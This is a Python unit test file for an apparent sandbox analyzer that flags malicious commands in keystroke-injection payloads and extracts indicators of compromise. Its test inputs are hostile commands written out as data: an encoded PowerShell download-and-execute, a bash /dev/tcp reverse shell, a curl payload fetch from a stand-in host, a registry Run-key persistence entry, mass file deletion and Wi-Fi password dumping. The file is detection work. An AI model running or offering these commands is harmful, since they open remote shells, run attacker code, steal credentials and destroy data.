import base64
import unittest

from duckysandbox import analyzer
from duckysandbox.vmstate import VMState


class TestAnalyzer(unittest.TestCase):
    def setUp(self):
        self.vm = VMState()

    def _rule_ids(self, findings):
        return {f.rule_id for f in findings}

    def test_powershell_hidden_bypass(self):
        findings = analyzer.analyze_command(
            "powershell -nop -w hidden -ep bypass -Command whoami", 1, self.vm)
        ids = self._rule_ids(findings)
        self.assertIn("EXEC-PS", ids)
        self.assertIn("EVAS-HIDDEN", ids)
        self.assertIn("EVAS-BYPASS", ids)
        self.assertIn("EVAS-NOPROFILE", ids)
        self.assertIn("DISC-WHOAMI", ids)

    def test_process_event_recorded_for_powershell(self):
        analyzer.analyze_command("powershell -Command whoami", 1, self.vm, parent="explorer.exe")
        self.assertEqual(len(self.vm.processes), 1)
        proc = self.vm.processes[0]
        self.assertEqual(proc.name, "powershell.exe")
        self.assertEqual(proc.parent, "explorer.exe")

    def test_encoded_command_decoded_and_reanalyzed(self):
        inner = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')"
        b64 = base64.b64encode(inner.encode("utf-16le")).decode()
        findings = analyzer.analyze_command(f"powershell -enc {b64}", 1, self.vm)
        ids = self._rule_ids(findings)
        self.assertIn("EVAS-ENCODED", ids)
        self.assertIn("EXEC-IEX", ids)
        self.assertIn("C2-WEBCLIENT", ids)
        self.assertIn("198.51.100.23", self.vm.iocs["ips"])
        self.assertTrue(any("decoded base64" in n for n in self.vm.notes))

    def test_registry_run_key_persistence(self):
        cmd = ("New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
               "-Name Updater -Value 'C:\\Users\\Public\\update.exe' -PropertyType String -Force")
        findings = analyzer.analyze_command(cmd, 1, self.vm)
        ids = self._rule_ids(findings)
        self.assertIn("PERS-RUNKEY", ids)
        self.assertEqual(len(self.vm.registry), 1)
        reg = self.vm.registry[0]
        self.assertIn("CurrentVersion\\Run", reg.key)
        self.assertEqual(reg.value, "Updater")
        self.assertEqual(reg.data, "C:\\Users\\Public\\update.exe")

    def test_file_redirection_write_and_append(self):
        analyzer.analyze_command("whoami > C:\\out.txt", 1, self.vm)
        analyzer.analyze_command("systeminfo >> C:\\out.txt", 2, self.vm)
        ops = [(f.operation, f.path) for f in self.vm.files]
        self.assertIn(("write", "C:\\out.txt"), ops)
        self.assertIn(("append", "C:\\out.txt"), ops)
        self.assertIn("C:\\out.txt", self.vm.iocs["files"])

    def test_url_and_ip_ioc_extraction(self):
        analyzer.analyze_command(
            "curl http://evil.example.com:8080/payload.exe -o C:\\payload.exe", 1, self.vm)
        self.assertIn("http://evil.example.com:8080/payload.exe", self.vm.iocs["urls"])
        self.assertIn("evil.example.com", self.vm.iocs["domains"])
        net = self.vm.network[0]
        self.assertEqual(net.host, "evil.example.com")
        self.assertEqual(net.port, 8080)

    def test_devtcp_reverse_shell_extraction(self):
        findings = analyzer.analyze_command(
            "bash -i >& /dev/tcp/203.0.113.50/4444 0>&1", 1, self.vm)
        ids = self._rule_ids(findings)
        self.assertIn("C2-REVSHELL-BASH", ids)
        self.assertIn("EXEC-BASH", ids)
        self.assertIn("203.0.113.50", self.vm.iocs["ips"])
        self.assertEqual(self.vm.network[0].port, 4444)

    def test_mass_deletion_impact(self):
        findings = analyzer.analyze_command("del /f /s /q C:\\*", 1, self.vm)
        ids = self._rule_ids(findings)
        self.assertIn("IMPACT-DELETE", ids)
        self.assertEqual(analyzer.highest_severity(findings), "critical")

    def test_benign_command_low_noise(self):
        findings = analyzer.analyze_command("echo hello world", 1, self.vm)
        self.assertEqual(findings, [])

    def test_wifi_grabber_rules(self):
        f1 = analyzer.analyze_command("netsh wlan show profiles", 1, self.vm)
        f2 = analyzer.analyze_command('netsh wlan show profile name="Home" key=clear', 2, self.vm)
        self.assertIn("DISC-WIFI-LIST", self._rule_ids(f1))
        self.assertIn("CRED-WIFI-KEY", self._rule_ids(f2))


if __name__ == "__main__":
    unittest.main()
